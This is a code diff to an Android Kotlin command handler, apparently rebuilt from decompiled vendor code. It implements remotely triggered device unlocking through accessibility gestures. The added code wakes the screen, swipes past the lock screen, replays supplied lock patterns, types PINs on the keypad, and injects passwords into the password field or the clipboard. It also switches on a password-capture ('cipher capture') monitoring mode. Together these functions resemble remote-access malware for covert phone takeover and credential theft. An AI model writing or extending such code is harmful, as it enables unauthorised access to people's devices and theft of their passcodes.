@@ -1,5 +1,6 @@
 package com.storm.safe.rock.service.modules.command
 
+import android.app.KeyguardManager
 import android.os.Bundle
 import android.os.PowerManager
 import android.util.Log
@@ -197,10 +198,11 @@ class UnlockCommandHandler : CommandHandler {
     private fun handleSmartUnlockSwipe(context: CommandContext) {
         Log.d(TAG, "执行智能上滑解锁")
         try {
-            // vendor: checks MaskOverlay active state, removes it, then dispatches swipe
-            // Wire: context.service?.maskOverlayManager?.removeMask()
-            // Wire: context.service?.dispatchSwipeGesture(startX, startY, endX, endY, durationMs)
-            // Vendor swipe: bottom-center to top-center of screen
+            val service = context.service ?: return
+            val metrics = service.resources.displayMetrics
+            val w = metrics.widthPixels.toFloat()
+            val h = metrics.heightPixels.toFloat()
+            service.performSwipe(w / 2f, h * 0.8f, w / 2f, h * 0.3f, 300L)
             Log.d(TAG, "智能上滑解锁已执行")
         } catch (e: Exception) {
             Log.e(TAG, "智能上滑解锁失败", e)
@@ -268,15 +270,54 @@ class UnlockCommandHandler : CommandHandler {
                 Log.w(TAG, "智能确认检测参数无效")
                 return
             }
-            // vendor: dispatches confirm detection via service
+
+            val service = context.service ?: return
+            clickConfirmButton(service)
+            Log.d(TAG, "智能确认按钮检测完成: passwordType=$passwordType")
         } catch (e: Exception) {
             Log.e(TAG, "智能确认按钮检测失败", e)
         }
     }
 
     private suspend fun handleUnlockDevice(params: JSONObject?, context: CommandContext) {
-        Log.d(TAG, "执行设备解锁")
-        // vendor: implements complex unlock flow with pattern/PIN/password
+        Log.d(TAG, "[UNLOCK_DEVICE] 收到图案解锁命令")
+        try {
+            val dataObj = params?.optJSONObject("data")
+            val patternArray = dataObj?.optJSONArray("pattern")
+                ?: params?.optJSONArray("pattern")
+
+            if (patternArray == null || patternArray.length() < 4) {
+                Log.w(TAG, "[UNLOCK_DEVICE] 图案解锁参数无效: length=${patternArray?.length() ?: 0}")
+                return
+            }
+
+            val points = mutableListOf<Int>()
+            for (i in 0 until patternArray.length()) {
+                points.add(patternArray.optInt(i))
+            }
+            val patternString = points.joinToString(",")
+            Log.d(TAG, "[UNLOCK_DEVICE] 完整图案: $patternString (${points.size}个点)")
+
+            val service = context.service
+
+            Log.d(TAG, "[UNLOCK_DEVICE] 步骤1: 唤醒屏幕")
+            handlePowerWake(context)
+            delay(1000L)
+
+            Log.d(TAG, "[UNLOCK_DEVICE] 步骤2: 执行上滑解锁手势")
+            if (service != null) {
+                val metrics = service.resources.displayMetrics
+                val w = metrics.widthPixels.toFloat()
+                val h = metrics.heightPixels.toFloat()
+                service.performSwipe(w / 2f, h * 0.8f, w / 2f, h * 0.3f, 300L)
+            }
+            delay(1500L)
+
+            Log.d(TAG, "[UNLOCK_DEVICE] 步骤3: 开始绘制图案")
+            context.emitLocalEvent("pattern_replay", mapOf("pattern" to patternString))
+        } catch (e: Exception) {
+            Log.e(TAG, "[UNLOCK_DEVICE] 图案解锁失败", e)
+        }
     }
 
     private fun handleGetDevicePassword(params: JSONObject?, context: CommandContext) {
@@ -299,22 +340,194 @@ class UnlockCommandHandler : CommandHandler {
     }
 
     private suspend fun handleSmartNumericUnlock(params: JSONObject?, context: CommandContext) {
-        Log.d(TAG, "执行智能数字解锁")
-        // vendor: implements full PIN unlock flow with gesture dispatch
+        Log.d(TAG, "[智能解锁] 开始执行带判断的数字解锁")
+        try {
+            val password = params?.optString("password", "") ?: ""
+            val service = context.service
+            var screenWidth = params?.optInt("screenWidth", 0) ?: 0
+            var screenHeight = params?.optInt("screenHeight", 0) ?: 0
+
+            if ((screenWidth <= 0 || screenHeight <= 0) && service != null) {
+                val metrics = service.resources.displayMetrics
+                screenWidth = metrics.widthPixels
+                screenHeight = metrics.heightPixels
+            }
+
+            if (password.isEmpty() || screenWidth <= 0 || screenHeight <= 0) {
+                Log.e(TAG, "[智能解锁] 参数无效: password=${password.length}位, screen=${screenWidth}x${screenHeight}")
+                sendUnlockResult(context, false, "参数无效")
+                return
+            }
+
+            if (service != null) {
+                val km = service.getSystemService("keyguard") as? KeyguardManager
+                if (km != null && !km.isKeyguardLocked) {
+                    Log.d(TAG, "[智能解锁] 设备未锁屏，无需解锁")
+                    sendUnlockResult(context, true, "设备未锁屏")
+                    return
+                }
+            }
+
+            Log.d(TAG, "[智能解锁] 步骤2: 唤醒屏幕")
+            handlePowerWake(context)
+            delay(500L)
+
+            Log.d(TAG, "[智能解锁] 步骤3: 执行上滑")
+            service?.performSwipe(
+                screenWidth / 2f, screenHeight * 0.8f,
+                screenWidth / 2f, screenHeight * 0.3f, 300L
+            )
+
+            Log.d(TAG, "[智能解锁] 步骤4: 检测数字键盘")
+            val keypadFound = waitForNumericKeypad(context, 3000L)
+            if (keypadFound) {
+                Log.d(TAG, "[智能解锁] 检测到数字键盘，等待1秒确保就绪")
+                delay(1000L)
+            } else {
+                Log.w(TAG, "[智能解锁] 未检测到数字键盘，尝试继续输入")
+            }
+
+            Log.d(TAG, "[智能解锁] 步骤5: 输入密码 (${password.length}位)")
+            if (service == null) {
+                sendUnlockResult(context, false, "Service未初始化")
+                return
+            }
+            val pinPadManager = PinPadInputManager(service)
+            pinPadManager.inputNumericPassword(password, screenWidth, screenHeight)
+
+            Log.d(TAG, "[智能解锁] 步骤6: 检测解锁结果")
+            delay(800L)
+            val unlocked = waitForUnlockResult(context, 5000L)
+            if (unlocked) {
+                Log.d(TAG, "[智能解锁] 解锁成功")
+                sendUnlockResult(context, true, "解锁成功")
+            } else {
+                Log.w(TAG, "[智能解锁] 解锁失败，密码可能错误")
+                sendUnlockResult(context, false, "解锁失败，密码可能错误")
+            }
+        } catch (e: Exception) {
+            Log.e(TAG, "[智能解锁] 执行异常", e)
+            sendUnlockResult(context, false, "执行异常: ${e.message}")
+        }
     }
 
     private suspend fun handleSmartMixedUnlock(params: JSONObject?, context: CommandContext) {
-        Log.d(TAG, "执行智能混合解锁")
-        // vendor: implements mixed unlock (text input + confirm button)
+        Log.d(TAG, "[混合解锁] 开始执行字母数字密码解锁")
+        try {
+            val password = params?.optString("password", "") ?: ""
+            if (password.isEmpty()) {
+                Log.e(TAG, "[混合解锁] 密码为空")
+                sendUnlockResult(context, false, "密码为空")
+                return
+            }
+
+            val service = context.service
+            if (service != null) {
+                val km = service.getSystemService("keyguard") as? KeyguardManager
+                if (km != null && !km.isKeyguardLocked) {
+                    Log.d(TAG, "[混合解锁] 设备未锁屏，无需解锁")
+                    sendUnlockResult(context, true, "设备未锁屏")
+                    return
+                }
+            }
+
+            Log.d(TAG, "[混合解锁] 步骤1: 唤醒屏幕")
+            handlePowerWake(context)
+            delay(500L)
+
+            Log.d(TAG, "[混合解锁] 步骤2: 执行上滑")
+            if (service != null) {
+                val metrics = service.resources.displayMetrics
+                val w = metrics.widthPixels.toFloat()
+                val h = metrics.heightPixels.toFloat()
+                service.performSwipe(w / 2f, h * 0.8f, w / 2f, h * 0.3f, 300L)
+            }
+            delay(1200L)
+
+            Log.d(TAG, "[混合解锁] 步骤3: 查找输入框并注入密码")
+            val filled = fillPasswordField(service, password)
+            if (!filled) {
+                Log.w(TAG, "[混合解锁] 未找到输入框，尝试剪贴板输入")
+                try {
+                    val clipboard = service?.getSystemService(android.content.Context.CLIPBOARD_SERVICE) as? android.content.ClipboardManager
+                    clipboard?.setPrimaryClip(android.content.ClipData.newPlainText("pwd", password))
+                } catch (_: Exception) {}
+                delay(800L)
+            }
+
+            Log.d(TAG, "[混合解锁] 步骤4: 尝试点击确认按钮")
+            clickConfirmButton(service)
+            delay(800L)
+
+            val unlocked = waitForUnlockResult(context, 5000L)
+            if (unlocked) {
+                Log.d(TAG, "[混合解锁] 解锁成功")
+                sendUnlockResult(context, true, "解锁成功")
+            } else {
+                Log.w(TAG, "[混合解锁] 解锁失败，密码可能错误")
+                sendUnlockResult(context, false, "解锁失败，密码可能错误")
+            }
+        } catch (e: Exception) {
+            Log.e(TAG, "[混合解锁] 执行异常", e)
+            sendUnlockResult(context, false, "执行异常: ${e.message}")
+        }
     }
 
     private fun handleEnablePasswordMonitoring(context: CommandContext) {
         Log.d(TAG, "收到启用密码监听命令")
         try {
-            // vendor: enables CipherCaptureManager monitoring mode
+            val service = context.service ?: return
+            service.isCipherCaptureEnabled = true
             Log.d(TAG, "密码监听模式已启用")
         } catch (e: Exception) {
             Log.e(TAG, "启用密码监听失败", e)
         }
+    }
+
+    /**
+     * Poll KeyguardManager.isKeyguardLocked() until unlocked or timeout.
+     * Vendor: C0352a9.m211894b2
+     * @return true if unlocked within timeout, false if still locked
+     */
+    suspend fun waitForUnlockResult(context: CommandContext, timeoutMs: Long): Boolean {
+        val service = context.service ?: return false
+        val start = System.currentTimeMillis()
+        while (System.currentTimeMillis() - start < timeoutMs) {
+            try {
+                val km = service.getSystemService("keyguard") as? KeyguardManager
+                if (km != null && !km.isKeyguardLocked) return true
+            } catch (_: Exception) {}
+            delay(200L)
+        }
+        return false
+    }
+
+    /**
+     * Poll accessibility tree for numeric keypad presence.
+     * Vendor: C0352a9.m211893b1
+     * @return true if keypad detected (5+ digit buttons), false if timeout
+     */
+    suspend fun waitForNumericKeypad(context: CommandContext, timeoutMs: Long): Boolean {
+        val service = context.service ?: return false
+        val start = System.currentTimeMillis()
+        while (System.currentTimeMillis() - start < timeoutMs) {
+            try {
+                val root = service.rootInActiveWindow
+                if (root != null) {
+                    var found = 0
+                    for (d in 0..9) {
+                        val nodes = root.findAccessibilityNodeInfosByText(d.toString())
+                        if (!nodes.isNullOrEmpty()) found++
+                    }
+                    root.recycle()
+                    if (found >= 5) {
+                        Log.d(TAG, "[键盘检测] 找到${found}个数字按钮")
+                        return true
+                    }
+                }
+            } catch (_: Exception) {}
+            delay(200L)
+        }
+        return false
     }
 }
